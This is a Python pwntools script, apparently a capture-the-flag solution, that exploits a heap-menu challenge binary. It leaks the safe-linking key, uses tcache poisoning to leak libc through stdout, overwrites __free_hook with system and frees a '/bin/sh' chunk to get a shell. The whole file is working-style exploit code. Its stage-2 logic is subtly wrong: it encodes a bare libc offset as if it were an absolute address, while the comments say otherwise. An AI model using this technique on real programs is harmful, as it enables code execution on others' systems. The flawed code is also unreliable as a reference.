from pwn import *
from scipy import io

context.log_level = "info"

elf  = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

STDOUT_OFF   = 0x2115c0
FILE_JUMPS   = 0x20efd0
WFILE_JUMPS  = 0x20f1c8
FREE_HOOK    = 0x2171e8
SYSTEM_OFF   = 0x5c110

def start():
    # exact loader + libc
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])

def menu(io, c): io.sendlineafter(b"> ", str(c).encode())

def buy(io, idx):
    menu(io, 1)
    io.sendlineafter(b"idx?: > ", str(idx).encode())

def sell(io, idx):
    menu(io, 4)
    io.sendlineafter(b"> ", str(idx).encode())

def name(io, idx, data: bytes):
    menu(io, 2)
    io.sendlineafter(b"Which labubu to name: \n> ", str(idx).encode())
    io.sendafter(b"Name your labubu\n", data)

def admire(io, idx) -> bytes:
    menu(io, 3)
    io.sendlineafter(b"> ", str(idx).encode())
    return io.recvn(0x400)

def find_libc_base_from_stdout(leak: bytes):
    """
    Search stdout leak for a libc pointer that matches either _IO_file_jumps or _IO_wfile_jumps.
    Compute candidate bases and pick a page-aligned 0x7f... base.
    """
    candidates = []
    for i in range(0, len(leak) - 8):
        v = u64(leak[i:i+8])
        if (v >> 40) != 0x7f:
            continue
        for off in (FILE_JUMPS, WFILE_JUMPS):
            base = v - off
            if (base & 0xfff) == 0 and (base >> 40) == 0x7f:
                candidates.append((i, v, base, off))
    return candidates[0] if candidates else None

def main():
    io = start()

    # ---- Stage 1: leak safe-linking key (chunk_addr >> 12) ----
    buy(io, 0)
    sell(io, 0)
    leak = admire(io, 0)
    key = u64(leak[0:8])         # because next=NULL => stored_next = chunk>>12
    log.success(f"safe-linking key (chunk>>12) = {hex(key)}")

    # ---- Stage 2: tcache poison -> allocate at stdout ----
    # overwrite freed chunk0's next pointer with encoded(stdout)
    enc_stdout = STDOUT_OFF ^ key
    name(io, 0, p64(enc_stdout) + p64(0) + b"\n")

    buy(io, 1)   # gets original chunk back
    buy(io, 2)   # gets "chunk" at stdout address (libc + STDOUT_OFF)

    stdout_leak = admire(io, 2)

    # Debug: dump first 64 qwords and any 0x7f pointers
    log.info("Dumping first 64 qwords from stdout leak:")
    for i in range(64):
        v = u64(stdout_leak[i*8:(i+1)*8])
        log.info(f"{i*8:04x}: {hex(v)}")

    hits = []
    for i in range(0, len(stdout_leak) - 8, 8):
        v = u64(stdout_leak[i:i+8])
        if (v >> 40) == 0x7f:
            hits.append((i, v))
            if len(hits) >= 10:
                break
    log.info("First 10 libc-like qword hits (offset, value): " + str([(hex(o), hex(v)) for o, v in hits]))

    res = find_libc_base_from_stdout(stdout_leak)
    if not res:
        log.error("Failed to derive libc base from stdout leak. Paste the qword dump + hits to fix.")
        return

    off, ptr, libc_base, which = res
    log.success(f"stdout leak hit @+{off}: {hex(ptr)}")
    log.success(f"libc base = {hex(libc_base)} (matched {'_IO_file_jumps' if which==FILE_JUMPS else '_IO_wfile_jumps'})")

    # set libc base for convenience
    libc.address = libc_base
    free_hook = libc_base + FREE_HOOK
    system = libc_base + SYSTEM_OFF
    stdout = libc_base + STDOUT_OFF
    log.info(f"stdout     = {hex(stdout)}")
    log.info(f"__free_hook= {hex(free_hook)}")
    log.info(f"system     = {hex(system)}")

    # ---- Stage 3: tcache poison -> __free_hook ----
    # idx1 holds the original heap chunk (same address/key class)
    sell(io, 1)
    enc_hook = free_hook ^ key
    name(io, 1, p64(enc_hook) + p64(0) + b"\n")

    buy(io, 3)  # original chunk
    buy(io, 4)  # chunk at __free_hook

    # write system into __free_hook
    name(io, 4, p64(system) + b"\n")
    log.success("Overwritten __free_hook with system")

    # ---- Stage 4: trigger system("/bin/sh") ----
    buy(io, 5)
    name(io, 5, b"/bin/sh\x00\n")
    sell(io, 5)

    io.interactive()

if __name__ == "__main__":
    main()
